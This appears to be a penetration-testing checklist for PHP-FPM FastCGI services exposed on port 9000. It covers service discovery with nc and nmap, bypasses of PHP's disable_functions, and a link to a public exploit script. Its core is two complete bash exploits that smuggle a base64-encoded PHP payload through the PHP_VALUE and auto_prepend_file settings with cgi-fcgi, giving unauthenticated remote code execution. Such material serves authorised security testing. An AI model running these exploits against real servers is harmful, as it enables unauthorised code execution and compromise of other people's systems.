# FastCGI (Port 9000) Pentesting Checklist & Commands

## üéØ What am I realistically expecting to find here?

‚≠ê After enumerating FastCGI (port 9000), I realistically expect to find:

- [ ] Exposed PHP-FPM FastCGI service
- [ ] Potential for unauthenticated Remote Code Execution (RCE)
- [ ] Ability to abuse misconfigured `SCRIPT_FILENAME`
- [ ] Bypasses for `disable_functions` or `open_basedir`
- [ ] Usually only exposed on localhost but sometimes misconfigured externally

---

## ‚úÖ FastCGI Pentest Checklist

- [ ] **Service Discovery**
  - Check if port 9000 is open and responding.
    ```
    nc -vn <IP> 9000
    ```

- [ ] **Nmap Scan**
  - Even though FastCGI often won't be identified by nmap, it's worth a try.
    ```
    nmap -sV -p9000 <IP>
    ```

- [ ] **Manual Testing for RCE**
  - Bash one-liner to inject PHP payload via FastCGI.
    ```bash
    PAYLOAD="<?php system('id'); ?>"
    FN="/var/www/html/index.php"
    HOST=<IP>
    B64=$(echo "$PAYLOAD" | base64)
    env -i \
      PHP_VALUE="allow_url_include=1
allow_url_fopen=1
auto_prepend_file='data://text/plain;base64,$B64'" \
      SCRIPT_FILENAME=$FN SCRIPT_NAME=$FN REQUEST_METHOD=POST \
      cgi-fcgi -bind -connect $HOST:9000
    ```

- [ ] **Automated Exploit Example**
  - Use the well-known Python script.
    ```
    https://gist.github.com/phith0n/9615e2420f31048f7e30f3937356cf75
    ```

- [ ] **Check for Misconfigurations**
  - Test different paths if default index.php not found.
    ```
    /usr/share/nginx/html/index.php
    /var/www/html/index.php
    /srv/www/htdocs/index.php
    ```

- [ ] **Check for Bypasses**
  - Abuse of `allow_url_include` and `auto_prepend_file`.
  - Circumvent `disable_functions` with FastCGI injection.

---

## ‚úÖ FastCGI RCE Command Example

- **Minimal Bash Exploit**
    ```
    #!/bin/bash
    PAYLOAD="<?php echo '<!--'; system('whoami'); echo '-->'; ?>"
    FILE="/var/www/html/index.php"
    HOST=<IP>
    B64=$(echo "$PAYLOAD"|base64)

    env -i \
      PHP_VALUE="allow_url_include=1
allow_url_fopen=1
auto_prepend_file='data://text/plain;base64,$B64'" \
      SCRIPT_FILENAME=$FILE SCRIPT_NAME=$FILE REQUEST_METHOD=POST \
      cgi-fcgi -bind -connect $HOST:9000
    ```

---

## ‚úÖ Resources

- [Disable Functions Bypass with PHP-FPM FastCGI](https://book.hacktricks.xyz/pentesting-web/php-tricks-esp/php-useful-functions-disable_functions-open_basedir-bypass/disable_functions-bypass-php-fpm-fastcgi)
- [phith0n FastCGI Exploit Script](https://gist.github.com/phith0n/9615e2420f31048f7e30f3937356cf75)
``
